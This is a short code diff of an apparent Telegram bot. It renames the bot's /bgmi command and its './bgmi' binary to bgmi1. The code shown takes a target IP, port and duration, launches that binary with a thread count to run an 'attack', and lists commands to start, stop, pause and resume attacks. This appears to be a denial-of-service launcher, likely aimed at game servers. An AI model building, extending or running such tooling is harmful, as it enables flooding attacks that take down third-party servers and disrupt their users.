@@ -148,7 +148,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text("🛡️ Usage: /bgmi <target_ip> <port> <duration>")
+        await update.message.reply_text("🛡️ Usage: /bgmi1 <target_ip> <port> <duration>")
         return
 
     target_ip = context.args[0]
@@ -165,7 +165,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     # Updated command to remove protocol (udp/tcp)
-    command = ['./bgmi', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
+    command = ['./bgmi1', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
     try:
         process = subprocess.Popen(command)
         # Generate and display a unique attack ID
@@ -336,7 +336,7 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("ℹ️ Help Menu:\n"
                                       "/start - Start the bot\n"
-                                      "/bgmi - Start a new attack\n"
+                                      "/bgmi1 - Start a new attack\n"
                                       "/stop_attack - Stop an ongoing attack\n"
                                       "/pause - Pause an ongoing attack\n"
                                       "/resume - Resume a paused attack\n"
